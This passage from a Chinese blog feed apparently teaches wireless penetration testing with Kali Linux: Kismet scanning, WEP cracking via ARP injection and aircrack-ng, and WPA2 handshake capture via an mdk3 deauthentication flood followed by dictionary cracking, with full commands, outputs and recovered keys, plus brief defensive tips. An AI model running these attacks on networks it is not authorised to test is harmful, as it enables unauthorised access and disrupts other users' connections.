使用Kismet工具"></a>5.2 使用Kismet工具</h3><p>Kismet是一款嗅探无线网络工具。使用该工具可以监测周围的无线信号，并查看所有可用的无线接入点。下面将介绍使用Kismet工具扫描无线网络的方法。</p><p>使用Kismet工具扫描无线网络。具体操作步骤如下：</p><ol><li><p>启动Kismet工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kismet</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8726.png" alt="图片26"></p></li><li><p>该界面用来设置是否使用终端默认的颜色。因为Kismet默认的颜色是灰色，一些终端不能显示，所以这里不使用默认的颜色，此时单击No按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8727.png" alt="图片27"></p></li><li><p>该界面提示正在使用root用户运行Kismet工具。单击OK按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8728.png" alt="图片28"></p></li><li><p>该界面提示是否要自动启动Kismet服务。单击Yes按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8729.png" alt="图片29"></p></li><li><p>该界面显示设置Kismet服务的一些信息。这里使用默认设置，然后单击Start按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8730.png" alt="图片30"></p></li><li><p>该界面显示没有被定义的包资源，是否要现在添加。单击Yes按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8731.png" alt="图片31"></p></li><li><p>在该界面指定无线网卡接口和描述信息。在Intf文本框中，输入无线网卡接口wlan0。然后单击Add按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8732.png" alt="图片32"></p></li><li><p>在该界面单击Close Console Window按钮，将开始扫描无线网络，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8733.png" alt="图片33"></p></li><li><p>从该界面可以看到Kismet工具扫描到的所有无线AP信息。在该界面的左侧显示了捕获包的时间，扫描到的网络数和包数等。用户可以发现，在该界面只看到搜索到的无线AP、信道和包大小信息，但是没有看到这些AP的MAC地址及连接的客户端等信息。而且，默认无法选择AP。如果想查看连接当前AP的客户端，还需要进行设置。在菜单栏中依次选择Sort|First Seen命令，即可在第一屏中选择AP，并在第二屏中显示所连接的客户端，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8734.png" alt="图片34"></p></li><li><p>从该界面可以看到，显示名为CU_655w的AP详细信息，并且显示了连接的客户端。例如，连接的客户端MAC地址为FC:1A:11:9E:36:A6；AP的MAC地址为70:85:40:53:E0:3B，工作的信道为9，加密方式为TKIP、WPA和PSK等。如果想要查看AP的详细信息，则双击对应的AP。例如，查看名称为TP-LINK_A1B8的AP详细信息，显示结果如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8735.png" alt="图片35"></p></li><li><p>从该界面可以看到该AP的详细信息，如生产厂商、BSSID、信道、频率和信号强度等。如果想要停止扫描无线网络，则依次单击Kismet|Quit选项，将弹出停止Kismet服务对话框，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8736.png" alt="图片36"></p></li><li><p>单击Kill按钮，将停止Kismet服务并退出扫描界面。并且，将会在终端输出一些日志信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kismet</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>* KISMET CLIENT IS SHUTTING DOWN *</strong><br>[SERVER] INFO: Stopped source ‘wlan0mon’<br>[SERVER]<br>[SERVER] <strong>* KISMET IS SHUTTING DOWN *</strong><br>[SERVER] ERROR: TCP server client read() ended for 127.0.0.1<br>[SERVER] Shutting down log files…<br>[SERVER] INFO: Closed pcapdump log file ‘Kismet-20200106-14-01-12-1.pcapdump’, 80<br>[SERVER] logged.<br>[SERVER] INFO: Closed netxml log file ‘Kismet-20200106-14-01-12-1.netxml’, 4 logged.<br>[SERVER] INFO: Closed nettxt log file ‘Kismet-20200106-14-01-12-1.nettxt’, 4 logged.<br>[SERVER] INFO: Closed gpsxml log file ‘Kismet-20200106-14-01-12-1.gpsxml’, 0 logged.<br>[SERVER] INFO: Closed alert log file ‘Kismet-20200106-14-01-12-1.alert’, 0 logged.<br>[SERVER] INFO: Shutting down plugins…<br>[SERVER] ERROR: Not creating a VIF for wlan0mon even though one was requested,since the<br>[SERVER] interface is already in monitor mode. Perhaps an existing monitor mode<br>[SERVER] VIF was specified. To override this and create a new monitor mode VIF<br>[SERVER] no matter what, use the forcevif=true source option<br>[SERVER] WARNING: Kismet changes the configuration of network devices.<br>[SERVER] In most cases you will need to restart networking for<br>[SERVER] your interface (varies per distribution/OS, but<br>[SERVER] usually: /etc/init.d/networking restart<br>[SERVER]<br>[SERVER] Kismet exiting.<br>Spawned Kismet server has exited<br><strong>* KISMET CLIENT SHUTTING DOWN. *</strong><br>Kismet client exiting.<br></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在以上输出的信息中可以看到，成功将捕获到的数据写入了日志文件。其中，这些日志文件的前缀为Kismet<span class="number">-20190423</span><span class="number">-19</span><span class="number">-03</span><span class="number">-25</span><span class="number">-1.</span>*。如下：</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"># ls Kismet<span class="number">-20200106</span><span class="number">-14</span><span class="number">-01</span><span class="number">-12</span><span class="number">-1.</span>*</span><br><span class="line">Kismet<span class="number">-20200106</span><span class="number">-14</span><span class="number">-01</span><span class="number">-12</span><span class="number">-1.</span>alert     Kismet<span class="number">-20200106</span><span class="number">-14</span><span class="number">-01</span><span class="number">-12</span><span class="number">-1.</span>netxml</span><br><span class="line">Kismet<span class="number">-20200106</span><span class="number">-14</span><span class="number">-01</span><span class="number">-12</span><span class="number">-1.</span>gpsxml    Kismet<span class="number">-20200106</span><span class="number">-14</span><span class="number">-01</span><span class="number">-12</span><span class="number">-1.</span>pcapdump</span><br><span class="line">Kismet<span class="number">-20200106</span><span class="number">-14</span><span class="number">-01</span><span class="number">-12</span><span class="number">-1.</span>nettxt</span><br></pre></td></tr></table></figure><p></p><pre><code>从输出的信息可以看到，生成了5个文件位置。其中，每个日志文件保存的内容不同。如下：&gt; .alert：警报的纯文本日志文件。Kismet将对特别关注的事件发送警报。&gt; .gpsxml：XML格式的GPS日志文件。&gt; .nettxt：纯文本格式的网络信息。&gt; .netxml：XML格式的网络信息。&gt; .pcapdump：通过pcap捕获的实时数据通信文件。这取决于libpcap版本，此文件可能包含每个数据包的信息，包括GPS坐标信息。</code></pre><h2 id="六、无线网络密码攻击与防护"><a href="#六、无线网络密码攻击与防护" class="headerlink" title="六、无线网络密码攻击与防护"></a>六、无线网络密码攻击与防护</h2><p>通过实施无线网络扫描，即可找出攻击的目标。这里介绍如何对无线网络密码实施攻击，并提供一些防护措施。</p><h3 id="6-1-破解WEP无线网络密码"><a href="#6-1-破解WEP无线网络密码" class="headerlink" title="6.1 破解WEP无线网络密码"></a>6.1 破解WEP无线网络密码</h3><p>由于WEP加密使用的是RC4算法，导致WEP加密的网络很容易被破解。下面将介绍如何使用Aircrack-ng工具破解WEP加密的无线网络。</p><p>使用Aircrack-ng工具破解WEP无线网络密码。具体操作步骤如下：</p><ol><li><p>启动监听模式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airmon-ng start wlan0</span></span><br></pre></td></tr></table></figure></li><li><p>扫描无线网络，找出使用WEP加密的无线网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng wlan0</span></span><br><span class="line"></span><br><span class="line">BSSID        PWR        Beacons  <span class="comment">#Data, #/s  CH        MB  ENC  CIPHER  AUTH        ESSID</span></span><br><span class="line">                                     </span><br><span class="line"> 14:E6:E4:84:23:7A        -54        148         39     0    4        54e.  WEP   WEP        Test </span><br><span class="line"> 70:85:40:53:E0:3B        -60        229         74     0    4        130   WPA2  CCMP  PSK  CU_655w </span><br><span class="line">                                                                                      </span><br><span class="line"> BSSID                STATION         PWR   Rate    Lost    Frames  Probe  </span><br><span class="line"> 14:E6:E4:84:23:7A  1C:77:F6:60:F2:CC  -64   54e-54e  3252       98</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，ESSID为Test的无线网络使用的加密方式为WEP。所以，这里将选择对该无线网络密码实施破解。</p></li><li><p>捕获WEP无线网络数据包，并指定捕获到的数据包保存在wep文件中。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng --ivs -w wep --bssid 14:E6:E4:84:23:7A -c 1 wlan0</span></span><br><span class="line">CH  1 ][ Elapsed: 1 mins ][ 2019-04-23 20:15                                 </span><br><span class="line">                                                                                      </span><br><span class="line"> BSSID                PWR        RXQ        Beacons     <span class="comment">#Data, #/s CH MB  ENC  CIPHER AUTH        ESSID</span></span><br><span class="line">                                                                                      </span><br><span class="line"> 14:E6:E4:84:23:7A    -56        100        1211        20     795 1  54e.   WEP     WEP        Test  </span><br><span class="line">                                                                                </span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe     </span><br><span class="line">                                                                          </span><br><span class="line"> 14:E6:E4:84:23:7A  1C:77:F6:60:F2:CC  -64   54e-54e 0       144088</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示正在捕获Test无线网络的数据包。对于WEP加密无线网络是否能够被破解成功，主要取决于捕获的IVS数据包。从以上显示的Data列中可以看到，目前才捕获到20个包。为了加快捕获包的速度，用户可以使用Aireplay-ng工具实施注入攻击。其中，语法格式如下：</p><blockquote><p>aireplay-ng -3 -b [AP的MAC地址] -h [客户端MAC地址] wlan0</p></blockquote><p>以上语法中的参数-3，表示实施ARP注入攻击；-b指定AP的MAC地址；-h指定客户端的MAC地址。</p></li><li><p>实施ARP注入攻击，以加快捕获数据包的速度。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aireplay-ng -3 -b 14:E6:E4:84:23:7A -h 00:18:E7:BB:0C:38 wlan0</span></span><br><span class="line">20:14:16  Waiting <span class="keyword">for</span> beacon frame (BSSID: 14:E6:E4:84:23:7A) on channel 1</span><br><span class="line">Saving ARP requests <span class="keyword">in</span> replay_arp-0423-201416.cap</span><br><span class="line">You should also start airodump-ng to capture replies.</span><br><span class="line">Read 58106 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，则表示正在实施ARP注入攻击。此时，返回到Airodump-ng工具执行的终端，将发现#Data列的值在飞速增长。具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CH  1 ][ Elapsed: 3 mins ][ 2019-04-23 20:15                           </span><br><span class="line">                                                             </span><br><span class="line"> BSSID               PWR    RXQ     Beacons    <span class="comment">#Data,    #/s    CH    MB     ENC    CIPHER AUTH ESSID</span></span><br><span class="line">                                                                     </span><br><span class="line"> 14:E6:E4:84:23:7A   -56    100     1211       137501    795    1     54e.   WEP    WEP       Test       </span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe </span><br><span class="line"> 14:E6:E4:84:23:7A  1C:77:F6:60:F2:CC  -64   54e-54e     0   144088</span><br></pre></td></tr></table></figure><p>从该界面可以看到，Data列的值已达到137501。此时，用户即可尝试实施破解。一般情况下，当Data值达到10000以上时，可以尝试进行密码破解。如果无法成功破解密码，则继续捕获数据。</p><blockquote><p>以上命令执行成功后，生成的文件名是wep-01.ivs，而不是wep.ivs。这是为了方便后面破解时调用airodump-ng工具，对所有保存文件按顺序编号，于是就多了-01这样的序号。以此类推，在进行第二次攻击时，若使用同样的文件名wep保存，就会生成名为wep-02.ivs文件。</p></blockquote></li><li><p>实施密码破解。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># aircrack-ng wep-01.ivs </span></span><br><span class="line">   Opening wep-01.ivslease <span class="built_in">wait</span>...</span><br><span class="line">Read 27818 packets.</span><br><span class="line">      <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line">      1  14:E6:E4:84:23:7A                              Unknown</span><br><span class="line">   Choosing first network as target.</span><br><span class="line">   Opening wep-01.ivslease <span class="built_in">wait</span>...</span><br><span class="line">   Read 123408 packets.</span><br><span class="line">   1 potential targets</span><br><span class="line">   Attack will be restarted every 5000 captured ivs.</span><br><span class="line">   Starting PTW attack with 123407 ivs.</span><br><span class="line">   Aircrack-ng 1.5.2 </span><br><span class="line">   [00:00:03] Tested 167413 keys (got 27817 IVs)</span><br><span class="line">      KB    depth   byte(vote)</span><br><span class="line">       0   11/ 12   A7(31704) B5(31464) F5(31428) 85(31204) F4(31144) D2(31096) </span><br><span class="line">       91(31056) B0(31016) 8B(30832) </span><br><span class="line">       1   16/  1   B5(31636) 26(31420) 90(31240) DF(31196) EC(31136) 98(31008) </span><br><span class="line">       BC(30848) 8C(30732) 1B(30688) </span><br><span class="line">       2   11/ 16   C6(31976) 68(31944) 66(31568) AA(31388) 35(31368) 37(31132) </span><br><span class="line">       3A(31080) 0B(30948) 23(30904) </span><br><span class="line">       3   10/ 27   8C(31668) 93(31572) ED(31568) DB(31524) F5(31464) 9F(31356) </span><br><span class="line">       26(31280) 35(31240) 70(31204) </span><br><span class="line">       4   28/  4   3D(30660) 52(30544) 5D(30544) 24(30468) 07(30460) CE(30460) </span><br><span class="line">       38(30436) 4C(30368) 72(30248)</span><br><span class="line">       KEY FOUND! [ 61:62:63:64:65 ] (ASCII: abcde )</span><br><span class="line">       Decrypted correctly: 100%</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功破解了WEP无线网络的密码。其中，该密码的ASCII码为abcde，十六进制值为61:62:63:64:65。</p></li></ol><h3 id="6-2-破解WPA-WPA2无线网络密码"><a href="#6-2-破解WPA-WPA2无线网络密码" class="headerlink" title="6.2 破解WPA/WPA2无线网络密码"></a>6.2 破解WPA/WPA2无线网络密码</h3><p>WPA/WPA2加密方式本身很安全。但是，用户只要捕获到握手包，并且有足够强大的密码字典，就可能暴力破解出其密码。下面将介绍使用Aircrack-ng工具暴力破解WPA/WPA2无线网络密码的方法。</p><p>使用Aricrack-ng工具暴力破解WPA/WPA2无线密码。具体操作步骤如下：</p><ol><li><p>启动监听模式，并扫描无线网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng start wlan0</span></span><br><span class="line"><span class="comment"># airodump-ng wlan0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> CH 13 ][ Elapsed: 3 mins ][ 2021-01-23 21:40 ][ interface wlan0 down</span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span></span><br><span class="line"></span><br><span class="line"> 58:C8:76:62:13:18   -1        0        0    0   4   -1                    &lt;length:  0&gt;</span><br><span class="line"> 90:76:9F:C0:06:31   -1        0        0    0   2   -1                    &lt;length:  0&gt;</span><br><span class="line"> 34:96:72:69:D5:C3  -46      195        1    0  11  195   WPA2 CCMP   PSK  dz</span><br><span class="line"> 00:6B:8E:F4:2D:F0  -55       15        1    0  36  360   WPA2 CCMP   PSK  酷拽吊炸天</span><br><span class="line"> 00:6B:8E:F4:2D:E8  -56      168        0    0  11  130   WPA2 CCMP   PSK  酷拽吊炸天</span><br><span class="line"> 6A:35:FE:02:78:1C  -61      141        4    0  10  130   WPA2 CCMP   PSK  CU_4SQ5</span><br><span class="line"> 8C:21:0A:B4:EE:7A  -66      176      198    0   6  270   WPA2 CCMP   PSK  5-401</span><br><span class="line"> BC:54:FC:52:57:EF  -69      108        0    0   1  270   WPA2 CCMP   PSK  MERCURY_57EF</span><br></pre></td></tr></table></figure><p>从输出的信息可以看见扫描到的所有无线网络。此时，选择使用WPA/WPA2加密的无线网络。例如，这里将选择<code>酷拽吊炸天</code>无线网络，实施暴力破解。</p></li><li><p>使用Airodump-ng工具重新捕获数据包，并指定目标AP的BSSID、信道(CH)及文件保存位置。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng -c 36 -w wlan --bssid 00:6B:8E:F4:2D:F0 wlan0</span></span><br><span class="line"></span><br><span class="line">CH 36 ][ Elapsed: 4 mins ][ 2021-01-23 21:46 ][ interface wlan0 down</span><br><span class="line"></span><br><span class="line"> BSSID              PWR RXQ  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span></span><br><span class="line"></span><br><span class="line"> 00:6B:8E:F4:2D:F0  -57   0      102        7    2  36  360   WPA2 CCMP   PSK  酷拽吊炸天</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line"> 00:6B:8E:F4:2D:F0  CE:41:CF:CE:15:DD  -82   24e- 6     27       11</span><br><span class="line"> 00:6B:8E:F4:2D:F0  98:8D:46:D1:77:57   -1   24e- 0      0        2</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示正在捕获数据包。但是，如果要破解该无线网络的密码，必须要捕获到握手包。。此时，用户可以使用mdk3工具实施死亡攻击，以加快获取握手包的速度。</p><p>其语法格式如下：</p><blockquote><p>mdk3 wlan0 d -s [time] -c [channel]</p></blockquote><p>以上语法中，选项d表示实施死亡攻击；-s指定发送死亡包的时间间隔；-c指定攻击的信道，即AP所在的信道。</p></li><li><p>使用mdk3工具实施死亡攻击，以获取握手包。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mdk3 wlan0 d -s 120 -c 36</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> failed: Network is down</span><br><span class="line">wi_read(): Network is down</span><br></pre></td></tr></table></figure><p>执行以上命令后，返回到Airodump-ng捕获包界面，以观察是否捕获到了握手包。如果捕获到握手包，将会在右上角显示AP的MAC地址。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CH 36 ][ Elapsed: 20 mins ][ 2021-01-23 22:03 ][ WPA handshake: 00:6B:8E:F4:2D:F0</span><br><span class="line"></span><br><span class="line"> BSSID              PWR RXQ  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span></span><br><span class="line"></span><br><span class="line"> 00:6B:8E:F4:2D:F0  -54   0      462      264    0  36  360   WPA2 CCMP   PSK  酷拽吊炸天</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line"> 00:6B:8E:F4:2D:F0  98:8D:46:D1:77:57  -24   24e- 6e   164     1472  EAPOL</span><br><span class="line"> 00:6B:8E:F4:2D:F0  CE:41:CF:CE:15:DD  -51    1e- 1e     0      243</span><br><span class="line"> 00:6B:8E:F4:2D:F0  01:00:5E:00:00:02  -52    0 - 1      0        2</span><br><span class="line"> 00:6B:8E:F4:2D:F0  33:33:00:00:00:02  -53    0 - 1      0        2</span><br><span class="line"> 00:6B:8E:F4:2D:F0  01:00:5E:00:00:FC  -53    0 - 1      0       40</span><br><span class="line"> 00:6B:8E:F4:2D:F0  33:33:00:01:00:03  -53    0 - 1      0       38</span><br><span class="line"> 00:6B:8E:F4:2D:F0  33:33:00:01:00:02  -53    0 - 1      0        4</span><br><span class="line"> 00:6B:8E:F4:2D:F0  FF:FF:FF:FF:FF:FF  -53    0 - 1      0       22</span><br><span class="line"> 00:6B:8E:F4:2D:F0  33:33:00:00:00:FB  -53    0 - 1      0       34</span><br><span class="line"> 00:6B:8E:F4:2D:F0  33:33:FF:66:A7:D1  -54    0 - 1      0        2</span><br><span class="line"> 00:6B:8E:F4:2D:F0  01:00:5E:00:00:16  -54    0 - 1      0        8</span><br><span class="line"> 00:6B:8E:F4:2D:F0  33:33:00:00:00:16  -57    0 - 1      0        8</span><br><span class="line"> 00:6B:8E:F4:2D:F0  01:00:5E:00:00:FB  -88    0 - 1      0       36</span><br><span class="line"> 00:6B:8E:F4:2D:F0  01:00:5E:7F:FF:FA  -90    0 - 1      0       22</span><br></pre></td></tr></table></figure><p>从右上角可以看到，显示了WPA handshake。由此可以说明，已成功捕获到握手包。接下来，用户就可以实施暴力破解了。在该扫描过程中，生成的捕获文件名为wlan-01.cap。</p></li><li><p>实施暴力破解，并指定使用的密码字典为passwords.txt。其中，该密码字典需要用户手动创建。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># aircrack-ng -w passwords.txt wlan-01.cap </span></span><br><span class="line">   Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Opening kk-02.cap</span><br><span class="line">   Read 145299 packets.</span><br><span class="line">   </span><br><span class="line">      <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line">   </span><br><span class="line">      1  00:6B:8E:F4:2D:F0  酷拽吊炸天           WPA (1 handshake)</span><br><span class="line">   </span><br><span class="line">   Choosing first network as target.</span><br><span class="line">   </span><br><span class="line">   Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">   Opening kk-02.cap</span><br><span class="line">   Read 145299 packets.</span><br><span class="line">   </span><br><span class="line">   1 potential targets</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">                                  Aircrack-ng 1.6</span><br><span class="line">   </span><br><span class="line">         [00:00:00] 1/1 keys tested (76.25 k/s)</span><br><span class="line">   </span><br><span class="line">         Time left: --</span><br><span class="line">   </span><br><span class="line">                             KEY FOUND! [ fx757624276 ]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">         Master Key     : AE 79 8D C1 06 8E 4B 2E 32 F8 08 A9 81 B8 7C 60</span><br><span class="line">                          A4 ED 54 62 5A 81 66 0D CB F7 E5 4F 50 C5 A6 D7</span><br><span class="line">   </span><br><span class="line">         Transient Key  : 74 52 C0 71 A9 DE 92 DA 3A 3D F6 67 5C A4 40 20</span><br><span class="line">                          5E 4D 35 22 80 6D 9E 0B A0 54 16 97 03 AC 33 58</span><br><span class="line">                          3B 2D 37 5A 6C BB 0C C6 20 89 72 D7 95 0D A9 40</span><br><span class="line">                          90 8E D7 48 5D 6A 66 9D 4C CB 3D 51 55 CB 44 2E</span><br><span class="line">   </span><br><span class="line">         EAPOL HMAC     : 8F 09 FD 00 A1 84 BE 8E 61 38 9E F8 8B E0 F0 0B</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功破解了<code>酷拽吊炸天</code>无线网络的密码，该密码为<code>fx757624276</code>。</p></li></ol><h3 id="6-3-防护措施"><a href="#6-3-防护措施" class="headerlink" title="6.3 防护措施"></a>6.3 防护措施</h3><p>通过前面的介绍可以发现，不管是WEP加密还是WPA/WPA2加密都能够破解密码。为了使自己的无线网络尽可能安全，用户可以采取一些防护措施。下面介绍几个防护措施。</p><ul><li>更改无线路由器默认设置。</li><li>禁止SSID广播，防止被扫描搜索。</li><li>关闭WPS/QSS功能。</li><li>启用MAC地址过滤。</li><li>设置比较复杂的密码。例如，包括大小写字母、数字和特殊符号。</li></ul><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;无线网络渗透&quot;&gt;&lt;a href=&quot;#无线网络渗透&quot; class=&quot;headerlink&quot; title=&quot;无线网络渗透&quot;&gt;&lt;/a&gt;无线网
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="无线网络渗透" scheme="http://chenzhonzhou.github.io/tags/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Kali 安装所有工具包</title>
    <link href="http://chenzhonzhou.github.io/2021/01/06/kali-an-zhuang-suo-you-gong-ju-bao/"/>
    <id>http://chenzhonzhou.github.io/2021/01/06/kali-an-zhuang-suo-you-gong-ju-bao/</id>
    <published>2021-01-06T06:21:04.000Z</published>
    <updated>2021-01-13T03:44:22.975Z</updated>
    
